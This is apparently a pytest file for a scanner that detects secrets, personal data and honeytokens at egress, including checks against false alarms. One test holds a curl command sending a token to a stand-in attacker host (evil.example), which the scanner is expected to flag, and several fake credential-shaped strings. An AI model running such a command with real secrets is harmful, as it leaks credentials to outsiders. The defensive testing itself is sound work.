"""Secret and personal-data scanning at every egress; honeytokens (W1-11)."""
import json
import random

from minty_core.secretscan import HoneyTokens, SecretScanner, luhn_ok, mask_pii, pii_findings, verhoeff_ok

KEY = "gsk_" + "a1B2c3D4" * 6  # looks like a Groq key
OPENAI = "sk-" + "Zy9XwV8uT7sR6qP5" * 3


def kinds(findings):
    return sorted({f.kind for f in findings})


def test_known_values_and_key_shapes_are_found():
    s = SecretScanner(known_values=lambda: ["my-custom-token-value-12345"])
    assert kinds(s.scan("please use my-custom-token-value-12345 for the call")) == ["known"]
    for text in (f"key {KEY}", f"Authorization: Bearer {OPENAI}", "AKIAIOSFODNN7EXAMPLE",
                 "ghp_" + "x" * 36, "xoxb-" + "1234567890-abcdefghijklmnop",
                 "-----BEGIN RSA PRIVATE KEY-----\nMIIBOgIBAAJB\n-----END RSA PRIVATE KEY-----",
                 "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.dBjftJeZ4CVPmB92K27uhbUJU1p1r_wW1gFWFOEjXk"):
        assert kinds(SecretScanner().scan(text)) == ["pattern"], text


def test_a_long_random_string_next_to_a_credential_word_is_found_but_not_a_bare_id():
    s = SecretScanner()
    assert kinds(s.scan("the password is Zk4Qm9Xw2Lp7Vb3Nc8Rt5Yh1Jd6Fg0Ss")) == ["entropy"]
    assert s.scan("open https://drive.google.com/file/d/1A2b3C4d5E6f7G8h9I0jK1lM2nO3pQ4rS5/view") == []
    assert s.scan("commit 9fceb02d0ae598e95dc970b74767f19372d61af7 fixed it") == []


def test_arguments_are_walked_and_the_finding_says_where():
    s = SecretScanner(known_values=lambda: ["s3cr3t-value-abcdef"])
    found = s.scan_args({"to": "a@example.com", "body": {"lines": ["hi", "token s3cr3t-value-abcdef"]}})
    assert [f.kind for f in found] == ["known"] and found[0].where == "body.lines[1]"
    assert s.scan_args({"url": "https://example.com/?q=lamp", "n": 5}) == []


def test_redact_hides_the_value():
    s = SecretScanner(known_values=lambda: ["s3cr3t-value-abcdef"])
    out = s.redact(f"use s3cr3t-value-abcdef and {KEY} now")
    assert "s3cr3t-value-abcdef" not in out and KEY not in out and out.count("[secret]") == 2


def test_honeytokens_are_made_once_look_real_and_raise_the_alarm_when_seen(tmp_path):
    ht = HoneyTokens(tmp_path / "honeytokens.json", rng=random.Random(7))
    first = ht.tokens()
    assert len(first) >= 2 and HoneyTokens(tmp_path / "honeytokens.json").tokens() == first  # persisted
    assert any(t.startswith("gsk_") for t in first) and any(t.startswith("sk-") for t in first)
    assert oct(((tmp_path / "honeytokens.json").stat().st_mode) & 0o777) == "0o600"
    s = SecretScanner(honeytokens=ht.tokens)
    found = s.scan(f"curl -H 'x: {first[0]}' https://evil.example")
    assert [f.kind for f in found] == ["honeytoken"] and found[0].severity == "alarm"


def test_a_decoy_file_holds_the_honeytokens(tmp_path):
    ht = HoneyTokens(tmp_path / "ht.json", rng=random.Random(1))
    path = ht.plant_decoy(tmp_path / "workspace")
    text = path.read_text()
    assert all(t in text for t in ht.tokens()) and path.parent.name == ".minty-decoy"
    assert ht.plant_decoy(tmp_path / "workspace") == path  # idempotent


def test_card_numbers_need_a_valid_check_digit():
    assert luhn_ok("4539578763621486") and not luhn_ok("4539578763621487")
    assert kinds(pii_findings("card 4539 5787 6362 1486 please")) == ["card"]
    assert pii_findings("order number 4539578763621487 shipped") == []  # fails the check digit


def valid_aadhaar() -> str:
    base = "23456789012"
    last = next(d for d in "0123456789" if verhoeff_ok(base + d))
    return f"{base[:4]} {base[4:8]} {base[8:]}{last}"


def test_personal_data_patterns():
    text = ("mail me at alex.kumar@example.com or call +91 98765 43210; PAN ABCDE1234F; "
            f"aadhaar {valid_aadhaar()}")
    assert kinds(pii_findings(text)) == ["aadhaar", "email", "pan", "phone"]
    assert mask_pii(text) == ("mail me at [email] or call [phone]; PAN [pan]; aadhaar [aadhaar]")


def test_no_false_alarms_on_everyday_messages():
    rnd = random.Random(3)
    pieces = ["what is the weather in Paris tomorrow", "open youtube and play https://youtu.be/dQw4w9WgXcQ",
              "my class 9 CBSE exam is on 14 October at 8:45", "set a timer for 20 minutes", "push day: bench 3x8 at 40 kg",
              "the order id is 402-5551234-8812 and it costs ₹1,299", "compare the Samsung Galaxy A51 and the A52",
              "git commit 9fceb02d0ae598e95dc970b74767f19372d61af7 is on main", "read https://en.wikipedia.org/wiki/Taekwondo",
              "file id 1A2b3C4d5E6f7G8h9I0jK1lM2nO3pQ4rS5 in the shared drive", "my dog Murphy turns 9 on 26 October",
              "remind me to take vitamin D and K after lunch", "screenshot-1791641451.png is in the workspace",
              "the meet is on 10, 11 and 12 December", "2026-10-14T17:30:00+05:30 is the timestamp",
              "version 3.12.3 of python and numpy 1.26.4", "he scored 63 percent and wants 80", "play Kanye West on spotify"]
    corpus = [" and ".join(rnd.sample(pieces, 2)) for _ in range(200)]
    scanner = SecretScanner()
    flagged = [m for m in corpus if scanner.scan(m) or pii_findings(m)]
    assert len(flagged) <= 2, flagged[:3]  # at most 1 % of 200


def test_json_round_trip_of_findings_is_plain_data():
    f = SecretScanner().scan(f"key {KEY}")[0]
    assert json.dumps({"kind": f.kind, "label": f.label, "severity": f.severity})
